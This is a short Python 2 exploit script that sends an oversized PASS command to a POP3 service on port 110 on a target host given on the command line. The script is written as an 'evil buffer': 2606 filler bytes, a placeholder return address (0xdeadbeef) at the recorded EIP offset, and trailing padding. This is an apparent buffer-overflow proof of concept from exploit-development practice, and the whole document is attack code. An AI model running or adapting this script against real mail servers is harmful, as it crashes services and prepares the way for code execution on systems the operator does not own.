#!/usr/bin/python
import socket
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# EIP [*] Exact match at offset 2606
buffer = 'A' * 2606 + '\xef\xbe\xad\xde' + "C"*(2700-2606-4)

try:
	print "\nSending evil buffer..."
	s.connect((sys.argv[1],110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!."

except:
	print "Could not connect to POP3!"
